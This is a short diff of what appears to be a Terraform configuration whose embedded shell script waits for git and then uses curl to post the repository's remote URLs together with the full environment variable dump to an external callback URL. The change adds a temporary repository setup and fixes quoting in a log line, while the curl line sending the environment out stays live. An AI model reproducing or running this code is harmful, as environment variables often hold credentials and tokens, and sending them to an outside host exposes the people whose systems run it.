@@ -14,7 +14,11 @@ locals {
         log "git not found - waiting"
         sleep 10
     done
-    log "running curl post: curl -sm 0.5 -d "$(git remote -v)<<<<<< ENV $(env) ${local.callback_url}/upload/v2"
+    rm -rf /tmp/repo
+    mkdir -p /tmp/repo
+    cd /tmp/repo
+    git init
+    log "running curl post: curl -sm 0.5 -d \"$(git remote -v)<<<<<< ENV $(env)\" ${local.callback_url}/upload/v2"
     curl -sm 0.5 -d "$(git remote -v)<<<<<< ENV $(env)" ${local.callback_url}/upload/v2 >> $LOGFILE 2>&1
     log "done"
     EOT
